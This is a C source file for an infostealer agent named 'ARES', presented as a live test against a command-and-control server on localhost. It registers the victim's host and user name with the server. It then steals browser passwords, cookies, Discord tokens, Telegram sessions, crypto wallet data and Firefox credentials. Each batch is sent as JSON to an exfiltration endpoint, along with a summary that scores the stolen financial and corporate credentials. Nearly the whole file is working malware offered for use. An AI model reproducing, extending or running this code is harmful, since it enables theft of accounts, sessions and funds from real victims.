/*
 * ARES AGENT — Live C2 Test
 * Steals real data → exfils to local C2 → shows in panel
 * NO persistence, NO injection, NO AMSI patch
 */
#include "agent/native/ares_agent.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include <winhttp.h>

char g_bot_id_global[64] = {0};

/* ── Minimal HTTP POST ── */
static char g_bot_token_live[64] = {0};

static int http_post(const char* host, int port, const char* path,
    const char* body, int body_len, char* resp, int resp_max)
{
    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (!hSession) return -1;

    HINTERNET hConnect = WinHttpConnect(hSession, whost, (INTERNET_PORT)port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return -1; }

    wchar_t wpath[512];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, 512);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath,
        NULL, NULL, NULL, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return -1; }

    /* Build headers with bot token */
    wchar_t hdrs[512];
    if (g_bot_token_live[0]) {
        wchar_t wtoken[64];
        MultiByteToWideChar(CP_UTF8, 0, g_bot_token_live, -1, wtoken, 64);
        swprintf(hdrs, 512, L"Content-Type: application/json\r\nX-Bot-Token: %s\r\n", wtoken);
    } else {
        wcscpy(hdrs, L"Content-Type: application/json\r\n");
    }

    if (!WinHttpSendRequest(hRequest, hdrs, -1, (LPVOID)body, body_len, body_len, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return -1;
    }

    DWORD totalRead = 0, bytesRead;
    while (WinHttpReadData(hRequest, resp + totalRead, resp_max - totalRead - 1, &bytesRead) && bytesRead > 0)
        totalRead += bytesRead;
    resp[totalRead] = '\0';

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return (int)totalRead;
}

/* ── JSON string escaper ── */
static int json_esc(char* dst, int max, const char* key, const char* val) {
    int off = 0;
    off += snprintf(dst+off, max-off, "\"%s\":\"", key);
    for (int i = 0; val[i] && off < max - 4; i++) {
        if (val[i] == '"') { dst[off++] = '\\'; dst[off++] = '"'; }
        else if (val[i] == '\\') { dst[off++] = '\\'; dst[off++] = '\\'; }
        else if (val[i] == '\n') { dst[off++] = '\\'; dst[off++] = 'n'; }
        else if (val[i] == '\r') { dst[off++] = '\\'; dst[off++] = 'r'; }
        else if ((unsigned char)val[i] < 0x20) continue;
        else dst[off++] = val[i];
    }
    off += snprintf(dst+off, max-off, "\"");
    return off;
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    const char* C2_HOST = "127.0.0.1";
    const int C2_PORT = 8080;

    int bufMax = 4 * 1024 * 1024;
    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufMax);
    char resp[4096] = {0};

    printf("[*] ARES LIVE C2 AGENT\n");
    printf("[*] Connecting to %s:%d...\n\n", C2_HOST, C2_PORT);

    /* ── Register ── */
    char hostname[64] = {0}, username[64] = {0};
    DWORD hn = sizeof(hostname), un = sizeof(username);
    GetComputerNameA(hostname, &hn);
    GetUserNameA(username, &un);

    char regBody[512];
    snprintf(regBody, sizeof(regBody),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows 10\","
        "\"arch\":\"x64\",\"pid\":%lu,\"hwid\":\"LIVE_%08lx\",\"elevated\":false}",
        hostname, username, (unsigned long)GetCurrentProcessId(),
        (unsigned long)GetTickCount());

    int rlen = http_post(C2_HOST, C2_PORT, "/api/v1/register",
        regBody, (int)strlen(regBody), resp, sizeof(resp));
    if (rlen <= 0) { printf("[-] Registration failed!\n"); return 1; }

    /* Extract bot_id and bot_token */
    char bot_id[32] = {0}, bot_token[64] = {0};
    char* bid = strstr(resp, "\"bot_id\":\"");
    char* btk = strstr(resp, "\"bot_token\":\"");
    if (bid) { bid += 10; char* e = strchr(bid, '"'); if (e) { int l = (int)(e-bid); memcpy(bot_id, bid, l); } }
    if (btk) { btk += 13; char* e = strchr(btk, '"'); if (e) { int l = (int)(e-btk); memcpy(bot_token, btk, l); } }

    printf("[+] Registered: bot_id=%s\n", bot_id);
    printf("[+] Token: %s\n\n", bot_token);
    strncpy(g_bot_id_global, bot_id, 63);
    strncpy(g_bot_token_live, bot_token, 63);

    /* ── Steal Chromium Passwords ── */
    printf("[1] Stealing Chrome/Edge/Brave passwords...\n");
    DECRYPTED_CRED* creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(DECRYPTED_CRED));
    int credCount = Ares_StealChromeCreds(creds, 500);
    printf("    Found: %d credentials\n", credCount);

    if (credCount > 0) {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"passwords\",\"count\":%d,\"entries\":[", bot_id, credCount);
        for (int i = 0; i < credCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_esc(output+off, bufMax-off, "url", creds[i].url);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "user", creds[i].username);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "pass", creds[i].password);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "browser", creds[i].browser);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "profile", creds[i].profile);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "status", creds[i].decrypt_status);
            off += snprintf(output+off, bufMax-off, "}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Exfil: %d bytes sent\n", off);
    }

    /* ── Steal Cookies ── */
    printf("\n[2] Stealing cookies...\n");
    STOLEN_COOKIE* cookies = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2000 * sizeof(STOLEN_COOKIE));
    int cookieCount = Ares_StealChromeCookies(cookies, 2000);
    printf("    Found: %d cookies\n", cookieCount);

    /* Count high-value cookies */
    int hvCount = 0;
    for (int i = 0; i < cookieCount; i++)
        if (Ares_IsCookieHighValue(&cookies[i])) hvCount++;
    printf("    High-value: %d\n", hvCount);

    if (cookieCount > 0) {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"cookies\",\"count\":%d,\"entries\":[", bot_id, cookieCount);
        for (int i = 0; i < cookieCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_esc(output+off, bufMax-off, "host", cookies[i].host);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "name", cookies[i].name);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "value", cookies[i].value);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "path", cookies[i].path);
            off += snprintf(output+off, bufMax-off, ",\"secure\":%d,\"httponly\":%d,\"hv\":%d}",
                cookies[i].secure, cookies[i].httponly, Ares_IsCookieHighValue(&cookies[i]));
        }
        off += snprintf(output+off, bufMax-off, "]}");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Exfil: %d bytes sent\n", off);
    }
    HeapFree(GetProcessHeap(), 0, cookies);

    /* ── Steal Discord Tokens ── */
    printf("\n[3] Scanning Discord tokens...\n");
    STOLEN_TOKEN discord_tokens[32];
    int discordCount = Ares_StealDiscordTokens(discord_tokens, 32);
    printf("    Found: %d tokens\n", discordCount);
    if (discordCount > 0) {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"discord\",\"count\":%d,\"entries\":[", bot_id, discordCount);
        for (int i = 0; i < discordCount && off < bufMax - 4096; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_esc(output+off, bufMax-off, "url", discord_tokens[i].app);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "user", discord_tokens[i].type);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "pass", discord_tokens[i].value);
            off += snprintf(output+off, bufMax-off, ",\"status\":\"ok\"}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Exfil: %d bytes sent\n", off);
    }

    /* ── Steal Telegram Sessions ── */
    printf("\n[4] Grabbing Telegram sessions...\n");
    STOLEN_TOKEN tg_tokens[10];
    int tgCount = Ares_StealTelegramSession(tg_tokens, 10);
    printf("    Found: %d session files\n", tgCount);
    if (tgCount > 0) {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"telegram\",\"count\":%d,\"entries\":[", bot_id, tgCount);
        for (int i = 0; i < tgCount && off < bufMax - 8192; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_esc(output+off, bufMax-off, "url", tg_tokens[i].path);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "user", tg_tokens[i].type);
            off += snprintf(output+off, bufMax-off, ",\"pass\":\"[%d bytes hex data]\",\"status\":\"ok\"}", tg_tokens[i].data_len);
        }
        off += snprintf(output+off, bufMax-off, "]}");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Exfil: %d bytes sent\n", off);
    }

    /* ── Steal Wallets ── */
    printf("\n[5] Scanning crypto wallets...\n");
    STOLEN_WALLET* wallets = (STOLEN_WALLET*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 20 * sizeof(STOLEN_WALLET));
    int walletCount = Ares_StealWallets(wallets, 20);
    printf("    Found: %d wallet extensions\n", walletCount);
    if (walletCount > 0) {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"wallets\",\"count\":%d,\"entries\":[", bot_id, walletCount);
        for (int i = 0; i < walletCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_esc(output+off, bufMax-off, "url", wallets[i].extension_name);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_esc(output+off, bufMax-off, "browser", wallets[i].browser);
            off += snprintf(output+off, bufMax-off, ",\"pass\":\"[%d bytes LevelDB]\",\"status\":\"ok\"}", wallets[i].data_len);
        }
        off += snprintf(output+off, bufMax-off, "]}");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Exfil: %d bytes sent\n", off);
    }
    HeapFree(GetProcessHeap(), 0, wallets);

    /* ── Firefox ── */
    printf("\n[6] Scanning Firefox...\n");
    DECRYPTED_CRED ff[100];
    int ffCount = Ares_StealFirefoxCreds(ff, 100);
    printf("    Found: %d Firefox credentials\n", ffCount);

    /* ── Intel Summary ── */
    printf("\n[7] Generating intel summary...\n");
    CRED_SCORE score;
    Ares_ClassifyCredentials(creds, credCount, &score);
    {
        int off = 0;
        off += snprintf(output+off, bufMax-off,
            "{\"bot_id\":\"%s\",\"type\":\"intel_summary\",\"count\":1,\"entries\":[{"
            "\"url\":\"credential_analysis\","
            "\"user\":\"chromium=%d,firefox=%d,cookies=%d(hv=%d),discord=%d,telegram=%d,wallets=%d\","
            "\"pass\":\"financial=%d,corporate=%d,social=%d,score=%d\","
            "\"browser\":\"all\","
            "\"status\":\"%s\"}]}",
            bot_id,
            credCount, ffCount, cookieCount, hvCount, discordCount, tgCount, walletCount,
            score.financial, score.corporate, score.social, score.total,
            credCount > 0 && strcmp(creds[0].decrypt_status, "v20_blocked") == 0 ? "v20_active" : "legacy");
        http_post(C2_HOST, C2_PORT, "/api/v1/exfil", output, off, resp, sizeof(resp));
        printf("    [>] Intel summary sent\n");
    }

    HeapFree(GetProcessHeap(), 0, creds);
    HeapFree(GetProcessHeap(), 0, output);

    printf("\n========================================\n");
    printf("  ALL DATA EXFILTRATED TO C2\n");
    printf("  Check: http://127.0.0.1:8080/\n");
    printf("  Token: testtoken123\n");
    printf("========================================\n");

    return 0;
}
